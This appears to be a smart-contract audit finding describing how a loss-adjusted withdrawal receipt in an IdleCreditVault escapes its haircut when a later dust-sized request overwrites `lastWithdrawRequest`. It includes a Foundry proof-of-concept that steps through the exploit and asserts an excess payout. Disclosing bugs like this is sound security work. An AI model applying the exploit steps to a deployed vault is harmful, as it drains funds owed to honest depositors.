### Title
Loss-adjusted withdrawal receipts escape their haircut by overwriting `lastWithdrawRequest` with a later request - (contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault.requestWithdraw` guards against stacking a new request on top of an unclaimed loss-adjusted receipt, but it only inspects `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` — the *latest* request epoch. `_claimLossAdjustedWithdrawRequest` likewise only applies `lossRecoveryPriceByEpoch` to the epoch stored in `lastWithdrawRequest`. An attacker who holds a receipt from an epoch that suffered a `stopEpochWithDuration(_lossAmount)` haircut can make a tiny second withdrawal request in a subsequent epoch, moving `lastWithdrawRequest` forward. The loss-epoch receipt then falls out of the loss-adjusted claim path entirely while its amount remains in the `withdrawsRequests[_user]` aggregate, so `_claimFundedWithdrawRequest` pays it at par — a "directory traversal" of the epoch-scoped haircut boundary.

### Finding Description
The bug class of the external report is escaping an intended root/boundary (a resolved relative path reaching outside the served directory). The analog here is an epoch-scoped claim boundary: receipts created in a loss epoch must be paid at `lossRecoveryPriceByEpoch[epoch]`, not par.

Key mechanics in `contracts/strategies/idle/IdleCreditVault.sol`:

- `requestWithdraw` only checks whether `lastWithdrawRequest[_user]` points at a loss epoch before allowing a new request (lines 261–271). It then unconditionally sets `lastWithdrawRequest[_user] = currentEpoch` (line 282) and adds the new amount to `withdrawsRequests[_user]` (line 292). [1](#0-0) 
- `claimWithdrawRequest` first calls `_claimLossAdjustedWithdrawRequest`, which reads `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]` — again only the *last* epoch (lines 790–792). Since the attacker's latest request is in a normal epoch, this returns 0 and never clears `withdrawsRequestsByEpoch[_user][lossEpoch]` or subtracts it from `withdrawsRequests[_user]`. [2](#0-1) 
- `_claimFundedWithdrawRequest` then pays `withdrawsRequests[_user]` — which still contains the loss-epoch amount — at par via `_transferFundedClaim` (lines 338–349). [3](#0-2) 

So one receipt is paid once (no double-claim), but at the wrong price: the BB-first/proportional loss that `stopEpochWithDuration(_lossAmount)` crystallized into `lossRecoveryPriceByEpoch[lossEpoch]` is bypassed.

### Impact Explanation
Direct theft from the vault. The attacker receives `claimBasis` instead of `claimBasis * lossRecoveryPrice / RECOVERY_FULL`. Since the loss-adjusted funding only covers the haircut amount, the excess is paid from funds destined for other claimants/LPs, producing either insolvency for later claimants or direct dilution. Quantified gain: `claimBasis * (RECOVERY_FULL - lossRecoveryPrice) / RECOVERY_FULL` per receipt.

### Likelihood Explanation
Requires the pool to execute a loss-applying `stopEpochWithDuration(_lossAmount)` (honest manager action), which sets `lossRecoveryPriceByEpoch[epochNumber]` for the current request epoch. The attacker must hold a pending receipt in that epoch — achievable by calling `requestWithdraw` during the buffer before the lossy stop. The follow-up is fully unprivileged: a dust-sized second `requestWithdraw` in the next buffer plus waiting one epoch for `epochNumber > lastWithdrawRequest[_user]`. No KYC bypass, privileged role, or timing luck needed beyond the loss event itself.

### Recommendation
Track loss-epoch claims per-epoch rather than via a single `lastWithdrawRequest` slot. Options:
- In `requestWithdraw`, scan/block if *any* unclaimed `withdrawsRequestsByEpoch[_user][e]` (or `apr0Users[_user].principalEpoch == e`) exists with `lossRecoveryPriceByEpoch[e] != 0`, not just the last epoch.
- In `_claimLossAdjustedWithdrawRequest`, iterate or persist a separate `lossEpoch` marker set at `stopEpochWithDuration` time (e.g., `lossEpochByUser[user]`) so the haircut is applied regardless of later requests.
- Alternatively, settle loss-epoch receipts eagerly at stop time so they can never linger into a later-epoch aggregate.

### Proof of Concept
Foundry fork sketch (extend `test/foundry/IdleCreditVault.t.sol` patterns; uses the existing helpers `_depositWithUser`, `_startEpochAndCheckPrices`, `_stopEpochAndCheckPrices`):

```solidity
function testLossReceiptTraversesToParPayout() external {
    address attacker = makeAddr('attacker');
    uint256 amount = 10_000 * ONE_SCALE;

    // Buffer phase, epoch 0: attacker deposits AA and requests a normal withdraw.
    _depositWithUser(attacker, amount, true);
    vm.prank(attacker);
    uint256 basis = cdoEpoch.requestWithdraw(0, address(AAtranche)); // receipt in epoch 0

    // Epoch 0 runs; at stopEpochWithDuration the manager applies a loss,
    // setting lossRecoveryPriceByEpoch[0] < RECOVERY_FULL.
    _startEpochAndCheckPrices(0);
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, 0, cdoEpoch.epochDuration(), /*_lossAmount*/ basis / 2);
    uint256 lossPrice = strategy.lossRecoveryPriceByEpoch(0);
    assertGt(lossPrice, 0);
    assertLt(lossPrice, strategy.RECOVERY_FULL());

    // Epoch 1 buffer: attacker makes a tiny second request. The guard only checks
    // lossRecoveryPriceByEpoch[lastWithdrawRequest] — but lastWithdrawRequest is
    // *updated to epoch 1* by this very call, so epoch 0's haircut is orphaned.
    deal(address(AAtranche), attacker, 1); // ensure a share exists if prior request consumed all; else deposit dust
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(0, address(AAtranche)); // re-requests remaining/dust tranches
    assertEq(strategy.lastWithdrawRequest(attacker), 1);

    // Advance one epoch so epochNumber > lastWithdrawRequest.
    _startEpochAndCheckPrices(1);
    _stopEpochAndCheckPrices(1, initialProvidedApr, _expectedFundsEndEpoch());

    // Claim: _claimLossAdjustedWithdrawRequest sees lossEpoch == 1 (no loss price) and
    // returns 0; _claimFundedWithdrawRequest pays the *aggregate* withdrawsRequests,
    // which still contains the epoch-0 amount, at par.
    uint256 balPre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - balPre;

    uint256 entitled = basis * lossPrice / strategy.RECOVERY_FULL();
    assertGt(paid, entitled); // theft: paid at par instead of the loss-adjusted price
}
```

Key assertions to instrument: `strategy.withdrawsRequests(attacker)` still includes the epoch-0 amount after the claim path selection, and `strategy.withdrawsRequestsByEpoch(attacker, 0)` is non-zero yet never routed through `_clearWithdrawClaimForEpoch(_, 0, false)`. The broken invariant is the loss waterfall: haircut receipts are funded only to `lossRecoveryPrice`, so the excess payout drains the strategy's funded-claim reserve belonging to honest claimants.

  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
